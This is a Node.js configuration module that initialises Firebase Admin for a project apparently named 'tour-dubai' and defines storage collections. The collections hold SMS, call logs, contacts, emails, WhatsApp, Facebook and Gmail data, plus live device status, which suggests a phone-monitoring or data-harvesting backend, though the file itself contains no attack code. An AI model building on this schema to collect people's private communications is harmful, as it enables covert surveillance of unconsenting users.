const admin = require('firebase-admin');
const path = require('path');
const fs = require('fs');

// Initialize Firebase Admin
let firebaseApp;
try {
  // Check if we have service account credentials in environment variables (for deployment)
  if (process.env.FIREBASE_SERVICE_ACCOUNT) {
    const serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT);
    firebaseApp = admin.initializeApp({
      credential: admin.credential.cert(serviceAccount),
      databaseURL: process.env.FIREBASE_DATABASE_URL || 'https://tour-dubai-79253.firebaseio.com',
      storageBucket: process.env.FIREBASE_STORAGE_BUCKET || 'tour-dubai-79253.appspot.com'
    });
  } else {
    // Try to load from file (for local development)
    const serviceAccountPath = path.join(__dirname, '../tour-dubai-79253-firebase-adminsdk-fbsvc-e1ef867688.json');
    if (fs.existsSync(serviceAccountPath)) {
      const serviceAccount = require(serviceAccountPath);
      firebaseApp = admin.initializeApp({
        credential: admin.credential.cert(serviceAccount),
        databaseURL: 'https://tour-dubai-79253.firebaseio.com',
        storageBucket: 'tour-dubai-79253.appspot.com'
      });
    } else {
      console.warn('Firebase service account file not found, using default app initialization');
      // Use default app initialization (for cases where credentials are set via GOOGLE_APPLICATION_CREDENTIALS)
      firebaseApp = admin.initializeApp({
        databaseURL: process.env.FIREBASE_DATABASE_URL || 'https://tour-dubai-79253.firebaseio.com',
        storageBucket: process.env.FIREBASE_STORAGE_BUCKET || 'tour-dubai-79253.appspot.com'
      });
    }
  }
} catch (error) {
  if (error.code === 'app/duplicate-app') {
    firebaseApp = admin.app();
  } else {
    console.error('Firebase initialization error:', error);
    // Initialize with minimal config as fallback
    try {
      firebaseApp = admin.initializeApp({
        databaseURL: process.env.FIREBASE_DATABASE_URL || 'https://tour-dubai-79253.firebaseio.com',
        storageBucket: process.env.FIREBASE_STORAGE_BUCKET || 'tour-dubai-79253.appspot.com'
      });
    } catch (fallbackError) {
      console.error('Firebase fallback initialization failed:', fallbackError);
    }
  }
}

// Get Firebase services
const db = admin.firestore();
const rtdb = admin.database();
const storage = admin.storage();
const auth = admin.auth();

// Firebase collections
const COLLECTIONS = {
  NOTIFICATIONS: 'notifications',
  MESSAGES: 'messages',
  SMS: 'sms',
  CONTACTS: 'contacts',
  CALL_LOGS: 'call_logs',
  EMAILS: 'emails',
  MEDIA: 'media',
  DEVICES: 'devices',
  USERS: 'users',
  FACEBOOK: 'facebook_data',
  WHATSAPP: 'whatsapp',
  GMAIL: 'gmail_data'
};

// Firebase Realtime Database paths
const RTDB_PATHS = {
  LIVE_DATA: 'live_data',
  SYNC_STATUS: 'sync_status',
  DEVICE_STATUS: 'device_status',
  REAL_TIME_UPDATES: 'real_time_updates'
};

module.exports = {
  admin,
  db,
  rtdb,
  storage,
  auth,
  COLLECTIONS,
  RTDB_PATHS,
  firebaseApp
}; 